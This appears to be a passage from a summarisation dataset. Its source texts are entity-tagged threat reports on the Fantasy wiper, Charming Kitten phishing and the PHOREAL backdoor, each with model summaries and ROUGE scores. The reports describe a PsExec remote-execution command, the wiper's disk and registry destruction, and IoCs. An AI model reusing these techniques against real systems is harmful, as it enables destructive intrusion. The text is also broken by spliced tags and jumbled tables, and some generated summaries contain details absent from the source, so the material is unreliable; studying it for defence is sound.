12th , [DATE] 2022 to deploy [ORG] Host2IP , [GPE] Fantasy , and Sandals ( consecutively ) . Sandals : Igniting the Fantasy ( wiper)Sandals is a 32 - bit [PRODUCT] Windows executable written in C#/.NET . We chose the name because Sandals is an anagram of some of the command line arguments it accepts . It is used to connect to systems in the same network via [ORG] SMB , to write a batch file to disk that executes the Fantasy wiper , and then run that batch file via [ORG] PsExec with this command line string : PsExec.exe /accepteula -d -u \u201c < username > \u201d -p \u201c < password > \u201d -s \u201c C:\\<path>\\<GUID>.bat\u201dThe PsExec options have the following meanings:-d \u2013 Do n\u2019t wait for process to terminate ( non - interactive ) . /accepteula \u2013 Suppress display of the license dialog . -s \u2013 Run the remote process in the SYSTEM account . Sandals does not write the Fantasy wiper to remote systems . We believe that the Fantasy wiper is deployed via a supply - chain attack using the software developer \u2019s software update mechanism . This assessment is based on several factors : all victims were customers of the affected software developer ; the [GPE] Fantasy wiper was named in a similar fashion to legitimate versions of the software ; all victims executed the [GPE] Fantasy wiper within a [TIME] 2.5 [TIME] hour timeframe , where victims in [GPE] South [GPE] Africa were targeted [ORDINAL] first , then victims in [GPE] Israel , and finally victims in [GPE] Hong [GPE] Kong ( we attribute the delay in targeting to time zone differences and a hardcoded check - in time within the legitimate software ) ; and,2/10lastly , the Fantasy wiper was written to , and executed from , % SYSTEM%\\Windows\\Temp , the default temp directory for Windows systems . Additionally , we believe the victims were already using [ORG] PsExec , and Agrius operators chose to use [ORG] PsExec to blend into typical administrative activity on the victims \u2019 machines , and for ease of batch file execution . Table 1 lists the command line arguments accepted by Sandals . Table [CARDINAL] 1 . Sandals arguments and their descriptionsDescriptionRequired YesYesYesYesNoNoNoNoNoNoArgument - f < filepath>-u < username>-p < password>-l < filepath>-d < path>-s < integer > A path and filename to a file that contains a list of hostnames that should be targeted . The username that will be used to log into the remote hostname(s ) in argument -f . The username that will be used to log into the remote hostname(s ) in argument -f . The path and filename of the Fantasy wiper on the remote system that will be executed by the batch file created by Sandals . The location to which Sandals will write the batch file on the remote system . Default location is % WINDOWS%\\Temp . The amount of time , in seconds , that Sandals will sleep between writing the batch file to disk and executing . The default is [TIME] two [TIME] seconds . If -a is followed by the word file and a path and filename , Sandals uses the encryption key in the supplied file . If -a is followed by rsa or random , Sandals uses the RSACryptoServiceProvider class to generate a public - private key pair with a key size of [CARDINAL] 2,048.-a file < filepath > or -a random or -a rsa -dn < devicename > Specifies which drive to connect with on a remote system over [ORG] SMB . Default is - ps < filepath>-raC : . Location of PsExec on disk . Default is psexec.exe in the current working directory . If -ra is supplied at runtime , it sets the variable flag to True ( initially set to False ) . If flag = True , Sandals deletes all files written to disk in the current working directory . If flag = False , Sandals skips the file cleanup step . The batch file written to disk by Sandals is named < [PERSON] GUID>.bat , where the filename is the output of the Guid . [PRODUCT] NewGuid ( ) method . An example of a Sandals batch file is shown in Figure [CARDINAL] 2.Figure 2 . Sandals batch file ( top , in red ) and the decoded command line parameter ( bottom , in blue)The base64 string that follows fantasy35.exe is likely a relic of the execution requirements of [GPE] Apostle ( more details in the Attribution to Agrius section ) . However , the [GPE] Fantasy wiper only looks for an argument of [CARDINAL] 411 and ignores all other runtime input ( see the next section for more information ) . Fantasy wiper3/10The Fantasy wiper is also a 32 - bit [PRODUCT] Windows executable written in C#/.NET , so named for its filenames : fantasy45.exe and fantasy35.exe , respectively . Figure [CARDINAL] 3 depicts the execution flow of the Fantasy wiper.4/10Figure 3 . Fantasy wiper execution flowInitially , [GPE] Fantasy creates a mutex to ensure that [CARDINAL] only [CARDINAL] one instance is running . It collects a list of fixed drives but excludes the drive where the % WINDOWS% directory exists . Then it enters a for loop iterating over the drive list to build a recursive directory listing , and uses the RNGCryptoServiceProvider . [ORG] GetBytes method to create a cryptographically strong sequence of random values in a 4096 - byte array . If a runtime argument of [CARDINAL] 411 is supplied to the wiper , the for loop overwrites the contents of every file with the aforementioned byte array using a nested while loop . Otherwise , the for loop only overwrites files with a file extension listed in the [LOC] Appendix . Fantasy then assigns a specific timestamp ( 2037 - 01 - 01 00:00:00 ) to these file timestamp properties : [ORG] CreationTime LastWriteTimeUtcand then deletes the file . This is presumably done to make recovery and forensic analysis more difficult . During the for loop , the [GPE] Fantasy wiper counts errors within the current directory when attempting to overwrite files . If the number of errors exceeds [CARDINAL] 50 , it writes a batch file , % WINDOWS%\\Temp\\<GUID>.bat , that deletes the directory with the files causing the errors , and then self - deletes . File wiping then resumes in the next directory in the target list . Once the for loop completes , the Fantasy wiper creates a batch file in % WINDOWS%\\Temp called registry.bat . The batch file deletes the following registry keys : HKCR\\.EXE HKCR\\.dll HKCR\\*Then it runs the following to attempt to clear file system cache memory:%windir%\\system32\\rundll32.exe advapi32.dll , ProcessIdleTasksLastly , registry.bat deletes itself ( del % 0).Next , the [GPE] Fantasy wiper clears all Windows event logs and creates another batch file , system.bat , in % WINDOWS%\\Temp , that recursively deletes all files on % SYSTEMDRIVE% , attempts to clear file system cache memory , and self - deletes . Then Fantasy sleeps for [TIME] two [TIME] minutes before overwriting the system \u2019s [PERSON] Master [PERSON] Boot [PERSON] Record . [GPE] Fantasy then writes another batch file , % WINDOWS%\\Temp\\remover.bat , that deletes the Fantasy wiper from disk and then deletes itself . Then Fantasy wiper sleeps for [TIME] 30 [TIME] seconds before rebooting the system with reason code SHTDN_REASON_MAJOR_OTHER ( 0x00000000 ) \u2014 Other issue . It is likely that % SYSTEMDRIVE% recovery is possible . [NORP] Victims were observed to be back up and running within [TIME] a [TIME] matter [TIME] of [TIME] hours . Attribution to AgriusMuch of the code base from [GPE] Apostle , initially a wiper masquerading as ransomware then updated to actual ransomware , was directly copied to [GPE] Fantasy and many other functions in [GPE] Fantasy were only slightly modified from [ORG] Apostle , a known Agrius tool . However , the overall functionality of [GPE] Fantasy is that of a wiper without any attempt to masquerade as ransomware . Figure [CARDINAL] 4 shows the file deletion functions in [GPE] Fantasy and [GPE] Apostle , respectively . There are only a few small tweaks between the original function in [GPE] Apostle and the Fantasy implementation.5/10Figure [DATE] 4 . File deletion functions from the Fantasy wiper ( top , in red ) and [PERSON] Apostle ransomware ( bottom , in green)Figure [CARDINAL] 4 . File deletion functions from the Fantasy wiper ( top , in red ) and [PERSON] Apostle ransomware ( bottom , in green)Figure [CARDINAL] 5 shows that the directory listing function is almost a direct copy , with only the function variables getting a slight tweak between Apostle and Fantasy.6/10Figure 5 . Directory listing functions from the Fantasy wiper ( top , in red ) and [PERSON] Apostle ransomware ( bottom , in green)Finally , the [ORG] GetSubDirectoryFileListRecursive function in Figure [CARDINAL] 6 is also almost an exact copy . Figure [CARDINAL] 6 . Recursive directory listing functions from the Fantasy wiper ( top , in red ) and [PERSON] Apostle ransomware ( bottom , in green)In addition to the code reuse , we can see remnants of the [GPE] Apostle execution flow in [GPE] Fantasy . In the original analysis of [ORG] Apostle , [ORG] SentinelOne notes that \u201c Proper execution of the ransomware version requires supplying it with a base64 encoded argument containing an XML of an \u2018 RSAParameters \u2019 object . This argument is passed on and saved as [LAW] the [LAW] Public [LAW] Key used for the encryption process and is most likely generated on a machine owned by the threat actor . \u201d We can see in the batch file in Figure [CARDINAL] 7 , which Sandals creates on remote systems to launch [GPE] Fantasy , that the [ORG] same7/10base64 - encoded argument containing an XML of an [ORG] RSAParameters object is passed to [GPE] Fantasy at runtime . Fantasy , however , does not use this runtime argument . Figure [CARDINAL] 7 . Sandals passing to [GPE] Fantasy the same [ORG] RSAParameters object as was used by [ORG] Apostle ransomware [ORG] ConclusionSince its discovery in [DATE] 2021 , Agrius has been solely focused on destructive operations . To that end , Agrius operators probably executed a supply - chain attack by targeting an [NORP] Israeli software company \u2019s software updating mechanisms to deploy [GPE] Fantasy , its newest wiper , to victims in [GPE] Israel , [GPE] Hong [GPE] Kong , and [GPE] South [GPE] Africa . [GPE] Fantasy is similar in many respects to the previous Agrius wiper , [PERSON] Apostle , that initially masqueraded as ransomware before being rewritten to be actual ransomware . Fantasy makes no effort to disguise itself as ransomware . Agrius operators used a new tool , Sandals , to connect remotely to systems and execute [GPE] Fantasy . For any inquiries about our research published on [ORG] WeLiveSecurity , please contact us at threatintel@eset.com . [ORG] ESET [ORG] Research also offers private [ORG] APT intelligence reports and data feeds . For any inquiries about this service , visit [ORG] the [ORG] ESET [ORG] Threat [ORG] Intelligence page . IoCsSHA-1FilenameDetectionDescriptFantasy wiper . [CARDINAL] 1A62031BBB2C3F55D44F59917FD32E4ED2041224 fantasy35.exe [GPE] MSIL / [PRODUCT] KillDisk . I Fantasy wiper . 820AD7E30B4C54692D07B29361AECD0BB14DF3BE fantasy45.exe [GPE] MSIL / [PRODUCT] KillDisk . I 1AAE62ACEE3C04A6728F9EDC3756FABD6E342252 host2ip.exe Resolves a hostname to [CARDINAL] 5485C627922A71B04D4C78FBC25985CDB163313B [NORP] MiniDump.exe [GPE] MSIL / Riskware . [ORG] LsassDumper . H Implementation of Mimik dumps credentials from [PERSON] Batch file that wipes som and is dropped and exec Fantasy wiper . Python script that dumps hashes . Sandals lateral moveme [GPE] Fantasy spreader . [ORG] B3B1EDD6B80AF0CDADADD1EE1448056E6E1B3274 [ORG] spchost.exeDB11CBFFE30E0094D6DE48259C5A919C1EB57108 [ORG] registry.bat3228E6BC8C738781176E65EBBC0EB52020A44866secretsdump.py Python / Impacket . ABAT / Agent . NRGMSIL / Agent . XHcleanMITRE ATT&CK techniquesThis table was built using version [CARDINAL] 12 of the MITRE ATT&CK framework . TacticResource T1587.001 Develop Capabilities : T1078.002 [PERSON] Valid [PERSON] Accounts : [ORG] MalwareDomain AccountsT1078.003 [PERSON] Valid [PERSON] Accounts : [ORG] LocalExecutionT1059.003Accounts [ORG] ShellDescriptionAgrius builds utility tools to use during an active exploitation process . Agrius builds custom malware including wipers ( Fantasy ) and lateral movement tools ( Sandals ) . Agrius operators attempted to capture cached credentials and then use them for lateral movement . Agrius operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network . Fantasy and Sandals both use batch files that run via the Windows command shell.8/10TacticIDNameDescriptionPrivilege ManipulationT1070.006 Indicator Removal onHost : Timestomp SMB / Windows Admin Shares Lateral Tool TransferT1003T1135T1021.002T1570T1485Data DestructionT1561.002 Disk Wipe T1561.001 Disk Wipe : Disk Shutdown / RebootT1529Fantasy uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs in advapi32.dll to grant its process token the SeShutdownPrivilege to reboot [PRODUCT] Windows . Agrius operators timestomped the compilation timestamps of [ORG] Fantasy [ORG] and [ORG] Sandals . Agrius operators used several tools to dump OS credentials for use in lateral movement . Agrius operators used cached credentials to check for access to other systems within an internal network . Agrius operators used cached credentials to connect over SMB to systems within an exploited internal network . Agrius operators used Sandals to push batch files over [ORG] SMB to other systems within an internal network . The Fantasy wiper overwrites data in files and then deletes the files . Fantasy wipes the MBR of the Windows drive and attempts to wipe the OS partition . Fantasy wipes all disk contents from non - Windows drives that are fixed drives . Fantasy reboots the system after completing its disk and data wiping payloads . AppendixFile extensions ( [CARDINAL] 682 ) targeted by Fantasy wiper when not targeting all file extensions . File extensions highlighted in yellow ( 68 ) are common filename extensions in Windows . Notably absent are file extensions dll and sys.$$ db - journal htm1 pqb - backup srw", "generated_text": "ESET researchers; a supply-chain attack; an Israeli software developer; the diamond industry; February 2022; the group; the Israeli software developer; a new wiper; Fantasy; Sandals; ransomware; Apostle; code; most of its code base; Apostle; part; its code base; Apostle; the fantasy wiper; Windows; Powershells; internal reconnaissance; Sandals; victims; South Africa; Israel; Hong Kong; the campaign; a short time; detection; antivirus; activity; the attack; credentials; a C# implementation; MiniDump; credentials; LSASS dump; Mimikatz; pypykatz; credentials; LSASS dump; an Egyptian; AES; detection; the AES; detections; the malware; a new lateral movement; Sandals; detection.", "ref_text": "<START-1>The PDF describes research by ESET on a new wiper malware called Fantasy that was deployed via a supply-chain attack by the threat actor group Agrius. Agrius abused an Israeli software developer's update mechanism to distribute the Fantasy wiper to customers in the diamond industry. The campaign began with reconnaissance activities in February 2022 at a South African diamond industry organization. Then on March 12th, Agrius deployed the Fantasy wiper and a lateral movement tool called Sandals to victims in South Africa, Israel, and Hong Kong over the span of around 3 hours. Fantasy is based on Agrius's previous wiper Apostle but does not disguise itself as ransomware. It recursively overwrites files on fixed drives with random data before deleting them. Sandals uses stolen credentials to spread Fantasy batch files to systems on the network via SMB and PsExec. Analysis shows Fantasy shares much code with Apostle. Both were written in .NET C# and have very similar functions for listing directories, deleting files, and more. Fantasy still contains remnants of Apostle's execution flow requiring an encoded XML key parameter. The supply-chain attack through the software updater allowed wide distribution of Fantasy across many customers of the developer. Though destructive, the attack was contained quickly, with ESET blocking Fantasy executions within hours. The developer also pushed out clean updates to end the campaign. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5507246376811594, "gpt3/lexical/rouge_rouge2": 0.18446601941747573, "gpt3/lexical/rouge_rougeL": 0.25120772946859904, "gpt3/lexical/rouge_rougeLsum": 0.25120772946859904, "gpt3_generated_text": ["ESET researchers have uncovered a supply-chain attack targeting an Israeli software developer, resulting in the deployment of a new wiper called Fantasy by the Agrius APT group. The attack, which took place in February 2022, targeted the diamond industry and involved the use of a new execution tool named Sandals. Most of the code base for Fantasy comes from the group's previous wiper, Apostle, and the attack also involved the deployment of Powershells for internal reconnaissance. Victims of the attack included organizations in South Africa, Israel, and Hong Kong, with the entire campaign lasting less than three hours. Fortunately, ESET's antivirus activity successfully detected and blocked the attack, providing protection to its customers. The attackers utilized various tools such as MiniDump and SecretsDump to gather credentials, which were then used by Sandals to spread and execute the Fantasy wiper. Sandals, a 32-bit Windows executable, was used to connect to systems in the same network via SMB and write a batch file to execute the wiper. Overall, the attack demonstrated the group's advanced capabilities in conducting supply-chain attacks and deploying destructive malware."]}, {"split_name": "test", "sample_id": "test_131", "prompt_text": "Extract the keywords: [ORG] The [ORG] Kittens [ORG] Are [ORG] Back in Town [CARDINAL] 2 \u2013 Charming Kitten Campaign Keeps Going on , Using New Impersonation Methodsclearskysec.com/the-kittens-are-back-in-town-2by [ORG] ClearSky [ORG] Research [DATE] TeamOctober 7 , [DATE] 2019thOn [DATE] the [DATE] 15 [DATE] of [DATE] September [DATE] 2019 , we have published a report[1 ] about a sharp increase in [PERSON] Charming [PERSON] Kitten attacks against researchers from the [GPE] US , [LOC] Middle [LOC] East , and [GPE] France , focusing on [NORP] Iranian academic researchers , [NORP] Iranian dissidents in the [GPE] US . In our last report , we exposed a new cyber espionage campaign that was conducted in [DATE] July [DATE] 2019 . Since then , we observed another wave of these attacks , leveraging new impersonating vectors and IOCs . Until [DATE] these [DATE] days , [GPE] Iran was not known as a country who tends to interfere in elections around the world . From a historical perspective , this type of cyber activity had been attributed mainly to the [NORP] Russian APT groups such as [GPE] APT28 ( known as [PERSON] Fancy [PERSON] Bear ) . The group is infamous for hacking [ORG] American [ORG] Democratic [ORG] National [ORG] Committee emails and targeting [NORP] German and [NORP] French campaign members , in an attempt to circumvent the elections in the [GPE] US , [GPE] Germany , and [GPE] France . [ORG] Microsoft \u2019s [DATE] October announcement exposes , for the \ufb01rst time , that [PERSON] Charming [PERSON] Kitten , an [NORP] Iranian [ORG] APT group , plays a role in the domain of cyber - attacks for the purpose of interfering with democratic procedures.thOn [DATE] 4 [DATE] of [DATE] October [DATE] 2019[2 ] , [ORG] Microsoft has announced that Phosphorus ( known as [PERSON] Charming [PERSON] Kitten ) attempted to attack email accounts that are associated with the following targets : [GPE] U.S. presidential campaign , current , and former [GPE] U.S. government of\ufb01cials , journalists covering global politics , and prominent [NORP] Iranians living outside [GPE] Iran . These spear - phishing attacks were conducted by [PERSON] Charming [PERSON] Kitten in [DATE] August and [DATE] September . We evaluate in a medium - high level of con\ufb01dence , that [ORG] Microsoft \u2019s discovery and our \ufb01ndings in our previous and existing reports is a congruent operation . Read the full report : [WORK_OF_ART] The [WORK_OF_ART] Kittens [WORK_OF_ART] Are [WORK_OF_ART] Back in Town [CARDINAL] 2Our evaluation based on the following issues:1 . Same victim pro\ufb01les \u2013 In both cases , the victims were individuals of interest to [GPE] Iran in the\ufb01elds of academic research , human rights , opposition to [GPE] the [GPE] Islamic [GPE] Republic [GPE] of [GPE] Iran \u2019s regime ( such as [ORG] NIAC ) and journalists . Although the congruent is not exactly similar , our sample is mainly based on [NORP] Israeli victims.2 . Time overlapping \u2013 In our latest report , we mentioned that we have observed anescalation of the attacks in [DATE] July - [DATE] August [DATE] 2019 . In their announcement , [ORG] Microsoft mentioned that the attacks occurred on \u2018 In a 30 - day period [DATE] between [DATE] August and September\u2019.url Kittens Are Back in Town 2 - Charming Kitten Campaign Keeps Going on , Using New Impersonation Methods - ClearSky Cyber Security3 . Similar attack vectors \u2013 In both cases , [PERSON] Charming [PERSON] Kitten used similar attack vectors whichare : both cases.and Yahoo services.1 . [PERSON] Password recovery impersonation of the [ORDINAL] secondary email belonging to the victims in2 . Both attack vectors used spear - phishing emails in order to target [ORG] Microsoft , [GPE] Google3 . In our research , we identi\ufb01ed a spear - phishing attack via SMS messages , indicating that [ORG] Charming [ORG] Kitten gathers phone numbers of the relevant victim . [ORG] Microsoft found that [PERSON] Charming [PERSON] Kitten gathers phone numbers for password recovery and [CARDINAL] two - factor authentications of the relevant victims to gain control of their email accounts . In this report , we uncovered [CARDINAL] four new spear - phishing methods used by this group , alongside with new indicators of this operation . Indicators of compromise are available for subscribers of the [ORG] ClearSky threat intelligence service in [ORG] MISP events [CARDINAL] 1745.[1 ] url url vigilant / url", "generated_text": "PDF; the study; ClearSky Cyber Security; Charming Kitten; emails; the US presidential campaign; journalists; world politics; the attacks; July 2019; September 2019; the campaign; Occupy Central; Iranian dissidents; the Middle East; the US; the attacks; a combination; Pokeman; The IOCs; IOCs; time; IOCs; intelligence; privilege escalation; security; the discovery; techniques; attacks.", "ref_text": "<START-1>The document reports on continued activity by the Iranian cyberespionage group Charming Kitten, also known as Phosphorus. Charming Kitten conducted attacks against US presidential campaign staff, US government officials, journalists, and Iranian dissidents in August-September 2019. This overlaps with attacks ClearSky researchers observed in July-August 2019 against academics, human rights activists, and Iranian opposition groups. The attacks leveraged similar tactics like password reset emails and spear phishing links impersonating Google, Microsoft, and Yahoo. Charming Kitten appears to be expanding operations from traditional academic and dissident targeting to now also interfere in democratic processes like elections. This is an evolution from previous Iranian cyber activity and more similar to tactics of Russian groups like APT28. New indicators show Charming Kitten gathering phone numbers for password recovery and two-factor authentication bypass. Four new spear phishing tactics were observed including SMS messages to target victims. The targeting of election staff represents an escalation and expansion of operations for Charming Kitten. The group is increasing sophistication and aligning more with Russian-style information operations and interference. Ongoing vigilance is recommended against this persistent threat group as they continue honing tactics. In summary, this documents the expanded cyberespionage operations of the Charming Kitten group against new target sets in 2019 using sophisticated impersonation tactics. Their activity poses an increasing threat of election interference moving forward. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44999999999999996, "gpt3/lexical/rouge_rouge2": 0.10552763819095479, "gpt3/lexical/rouge_rougeL": 0.20999999999999996, "gpt3/lexical/rouge_rougeLsum": 0.20999999999999996, "gpt3_generated_text": ["The article discusses the ongoing cyber espionage campaign by the Iranian APT group known as Charming Kitten. The group has targeted researchers, dissidents, and journalists in the US, Middle East, and France, with a focus on Iranian academic researchers and dissidents in the US. This campaign, which started in July 2019, has seen a sharp increase in attacks using new impersonation methods and attack vectors. Previously, such cyber activity had been attributed mainly to Russian APT groups. However, Microsoft's October announcement revealed that Charming Kitten has been involved in cyber attacks aimed at interfering with democratic procedures, including targeting the US presidential campaign, US government officials, journalists covering global politics, and prominent Iranians living outside Iran. The article highlights the similarities between the victims and attack vectors used by Charming Kitten in both the previous and current campaigns. It also mentions the use of spear-phishing emails and SMS messages to gather information and gain control of victims' email accounts. The article concludes by providing indicators of compromise for subscribers to the ClearSky threat intelligence service."]}, {"split_name": "test", "sample_id": "test_132", "prompt_text": "Extract the keywords: elastic.github.io /security - research / intelligence/2022/03/02.phoreal - targets - southeast - asia - financial - sector / article/ PHOREAL Malware Targets [ORG] the [ORG] Southeast [ORG] Asian [ORG] Financial [ORG] SectorPHOREAL [PERSON] RIZZO [PERSON] Malware Backdoor2022 - 03 - 07 Preamble\u00b6Elastic Security has identified an ongoing campaign targeting a [NORP] Vietnamese financial services institution with the [ORG] PHOREAL / [PERSON] RIZZO backdoor . While this malware has been in use for some time , this is the [ORDINAL] first time that we have observed it loading into memory as a defense evasion and campaign protection technique . Upon analysis of our own observations and previously reported information , we are tracking this activity group ( malware + technique + victimology ) as [CARDINAL] REF4322.What is the threat?\u00b6PHOREAL / RIZZO is a backdoor allowing initial victim characterization and follow - on post - exploitation operations to compromise the confidentiality of organizations \u2019 data . It has been reported in other research as being used exclusively by APT32 ( [ORG] AKA [ORG] SeaLotus , [ORG] OceanLotus , APT - C-00 , [PERSON] Group [PERSON] G0050).What is the impact?\u00b6APT32 largely targets victims with political or economic interests in [LOC] Southeast [LOC] Asia , specifically [GPE] Vietnam . What is [NORP] Elastic doing about it?\u00b6Elastic Security detailed how to triage one of these threat alerts , extracted observables for endpoint and network filtering , and produced a new malware signature for identification and mitigation of the threat across the fleet of deployed [WORK_OF_ART] Elastic [WORK_OF_ART] Agents . Investigation Details\u00b6While conducting [ORG] Threat [ORG] Discovery [ORG] & [ORG] Monitoring operations , [ORG] Elastic [ORG] Security researchers identified a cluster of shellcode_thread Windows memory protection alerts generated from an [NORP] Elastic Agent endpoint sensor . These particular alerts were interesting because they all occurred within the same cluster , and unusually they targeted the control.exe process . The Windows control.exe process handles the execution of [ORG] Control [ORG] Panel items , which are utilities that allow users to view and adjust computer settings . Generally when we observe false positives for the shellcode_thread protection , it is identified across a broad user - base and in many cases it is attributed to various gaming anti - cheat or [ORG] DRM ( [ORG] Digital [ORG] Rights [ORG] Management ) mechanisms . In this case , a single cluster and a [ORG] Microsoft signed target process was atypical , and worthy of further investigation . With our interest piqued from the outlier characteristics of the alerts , we investigated further to validate and Note characterize the threat:1/8Targeted process is a signed Windows binary You can read more about [ORG] Elastic [ORG] Security \u2019s memory protections HERE and about in - memory attacks HERE . Unsigned loaded .dll \" path \" : \" C:\\\\Windows\\\\SysWOW64\\\\tscon32.dll \" , \" name \" : \" tscon32.dll \" , [PERSON] Starting module from the alerting thread \" pe \" : { \" original_file_name \" : \" CONTROL.EXE \" } , \" name \" : \" control.exe \" , \" start_address_module \" : \" C:\\\\Windows\\\\SysWOW64\\\\tscon32.dll \" , Alerting memory region metadata \" Local\\\\{5FBC3F53 - A76D-4248 - 969A-31740CBC8AD6 } \" , \" \\\\\\\\.\\\\pipe\\\\{A06F176F-79F1 - 473E - AF44 - 9763E3CB34E5 } \" , \" list < T > too long \" , \" { FD5F8447 - 657A-45C1 - 894B - D533926C9B66}.dll \" , \" C:\\\\Windows\\\\syswow64\\\\control.exe \" , [CARDINAL] 2/8Thread data for pivoting \" start_address_bytes_disasm \" : \" mov edi , edi\\npush ebp\\nmov ebp , esp\\ncall 0x000043f0\\ncall 0x000043ea\\npush eax\\ncall 0x000043d0\\ntest eax , eax\\njnz [CARDINAL] 0x00000038\\npush dword ptr [ ebp+0x08 ] \" } , From the example alert we [ORDINAL] first identify the start_address_module which is the dll / module where the thread began . [ORG] C:\\\\Windows\\\\SysWOW64\\\\tscon32.dll is the start_address_module for the thread that we \u2019ve alerted on . It \u2019s also the only unsigned dll loaded , so a great place to focus our efforts . When checking the hash value in [ORG] VirusTotal , to identify previously disclosed information about the sample , we did not see any results . Digging deeper , we looked at the start_address_bytes , which are the [ORDINAL] first [CARDINAL] 32 bytes of our alerting thread . We can use the value of the start_address_bytes [ORG] VirusTotal by querying content : results , but they included the below entry [ORDINAL] first submitted in [DATE] July [DATE] 2021 . \\VT result matching ` start_address_bytes`In researching the results from [ORG] VirusTotal , we could see that threat researcher [PERSON] Felix [PERSON] Bilstein ( @fxb_b ) authored a crowdsourced [ORG] YARA rule identifying this as the [ORG] PHOREAL backdoor . Moving on to the [ORG] CONTENT tab , we can compare some of the strings from our alert with what has been previously reported to [ORG] VirusTotal . [GPE] VT result [ORG] CONTENT tabUsing the unique strings we identified above and the start_address_bytes , we can create a [ORG] YARA signature by converting the unique strings ( $ [MONEY] a ) and the start_address_bytes ( $ b ) into hex values as shown below . Converted [ORG] YARA stringsstrings : \\\\ \" \\\\.\\pipe\\{A06F176F-79F1 - 473E - AF44 - 9763E3CB34E5 } \" ascii wide $ [MONEY] a1 = { [DATE] 5C [DATE] 00 5C 00 [CARDINAL] 2E 00 5C 00 70 00 69 00 70 00 65 00 5C 00 7B 00 41 00 30 00 36 00 46 00 31 00 37 00 36 00 46 00 [CARDINAL] 2D 00 37 00 39 00 46 00 31 00 [CARDINAL] 2D 00 34 00 37 00 33 00 45 00 2D 00 [CARDINAL] 41 00 46 00 [CARDINAL] 34 00 [CARDINAL] 34 003/82D 00 39 00 37 00 36 00 33 00 45 00 33 00 43 00 42 00 33 00 34 00 45 00 35 00 7D 00 } \\\\ \" Local\\{5FBC3F53 - A76D-4248 - 969A-31740CBC8AD6 } \" ascii wide $ [MONEY] a2 = { [CARDINAL] 4C 00 [CARDINAL] 6F 00 63 00 61 00 6C 00 5C 00 7B 00 35 00 46 00 42 00 43 00 33 00 46 00 35 00 33 00 [CARDINAL] 2D 00 [CARDINAL] 41 00 37 00 36 00 44 00 [CARDINAL] 2D 00 34 00 [CARDINAL] 32 00 [CARDINAL] 34 00 38 00 [CARDINAL] 2D 00 39 00 36 00 39 00 [CARDINAL] 41 00 2D 00 33 00 31 00 37 00 34 00 30 00 43 00 42 00 43 00 38 00 [CARDINAL] 41 00 44 00 36 00 7D 00 } \\\\ \" { FD5F8447 - 657A-45C1 - 894B - D533926C9B66}.dll \" ascii $ a3 = { [CARDINAL] 7B 46 44 [CARDINAL] 35 46 38 34 [CARDINAL] 34 37 [CARDINAL] 2D 36 35 37 [CARDINAL] 41 [CARDINAL] 2D 34 35 43 31 [CARDINAL] 2D 38 39 34 42 2D 44 35 33 33 39 32 36 43 39 42 36 36 7D 2E 64 6C [CARDINAL] 6C } \\\\ PHOREAL start_address_bytes sequence \\\\ mov edi , edi ; push ebp ; mov ebp , esp ; call [CARDINAL] 0x000043f0 ; \\\\ call [PERSON] 0x000043ea ; push eax ; call 0x000043d0 ; test eax , eax ; \\\\ jnz 0x00000038 ; push dword ptr [ ebp+0x08 ] $ str_addr = { 8B FF [CARDINAL] 55 [CARDINAL] 8B [ORG] EC [CARDINAL] 56 [PRODUCT] E8 [PRODUCT] 3F 3E 00 00 [PRODUCT] E8 [PRODUCT] 34 3E 00 00 50 [PRODUCT] E8 [PRODUCT] 14 3E 00 00 [CARDINAL] 85 C0 75 [CARDINAL] 2A 8B 75 08 56 [PRODUCT] E8 [PRODUCT] 21 } condition : [CARDINAL] 2 of themThis rule when deployed to the [NORP] Elastic Agent will identify PHOREAL to customers and backstop prevention already provided through the shellcode_thread memory protection ( in customer environments with memory protection turned on ) . In our case this rule \u2019s deployment also enabled the collection of the malicious thread using the same mechanism detailed in our Collecting Cobalt Strike Beacons article . Shortly after the new [ORG] YARA artifact was deployed we had a new malware_signature alert in hand with the malicious thread captured from memory . Manual binary triage from our [PERSON] Malware [PERSON] Analysis and Reverse Engineering ( MARE ) Team quickly confirmed the sample was [ORG] PHOREAL / RIZZO by comparing the structure and functions between our sample and past reporting . Further , they were able to extract an RC4 encrypted domain from an [ORG] RCDATA resource as described in a [DATE] 2018 CYLANCE OceanLotus whitepaper . RC4 decrypting binary embedded URLThe domain identified by [ORG] MARE ( thelivemusicgroup[.]com ) currently resolves to [CARDINAL] 103.75.117[.]250 which is owned by Oneprovider[.]com , a dedicated server hosting company based out of [GPE] Canada with data centers distributed globally.url query results for [CARDINAL] 103.75.117[.]250 { \" ip \" : \" 103.75.117[.]250 \" , \" city \" : \" [GPE] Hong [GPE] Kong \" , \" region \" : \" [WORK_OF_ART] Central [WORK_OF_ART] and [WORK_OF_ART] Western \" , \" country \" : \" HK \" , \" loc \" : \" 22.2783,114.1747 \" , \" org \" : \" [WORK_OF_ART] AS133752 [WORK_OF_ART] Leaseweb [WORK_OF_ART] Asia [WORK_OF_ART] Pacific pte . ltd . \" , \" timezone \" : \" [LOC] Asia / Hong_Kong \" , \" name \" : \" Leaseweb Asia Pacific pte . ltd . \" , \" domain \" : \" leaseweb.com \" , \" route \" : \" 103.75.117[.]0/24 \" , \" type \" : \" hosting\"4/8 } , \" company \" : { \" name \" : \" [ORG] Oneprovider.com - Hong Kong Infrastructure \" , \" domain \" : \" oneprovider[.]com \" , \" address \" : \" [CARDINAL] 1500 Ste - Rose [ORG] LAVAL H7R 1S4 [FAC] Laval [FAC] Quebec , [GPE] Canada \" , \" country \" : \" CA \" , \" email \" : \" info@oneprovider.com \" , \" name \" : \" ONE PROVIDER \" , \" network \" : \" 103.75.117[.]0/24 \" , \" phone \" : \" +1 [CARDINAL] 514 286 - 0253 \" \" ip \" : \" 103.75.117[.]250 \" , \" cdn - api - cn-1[.]com \" ] } Most of the interesting information about the domain is privacy guarded , but the \u201c Updated \u201d and \u201c Created \u201d dates in the below figure might be useful for bounding how long this domain has been used maliciously.5/8url for thelivemusicgroup[.]comThe [NORP] Elastic Agent appears to have been deployed post - compromise which limited our ability to determine the vector of initial access . A [CARDINAL] 2017 [ORG] Mandiant report indicates that [ORG] PHOREAL may be deployed in an \u201c establish foothold \u201d capacity to allow for victim triage and follow - on post - exploitation tools . Analysis\u00b6Elastic Security utilizes the Diamond Model to describe high - level relationships between the adversaries and victims of intrusions . [ORG] REF4322 Diamond Model AnalysisAdversary Assessment Justification\u00b6We assess with high confidence based on observed activity and previous reporting that [PERSON] REF4322 is APT32 / [ORG] OceanLotus and the actor behind this incident . APT32 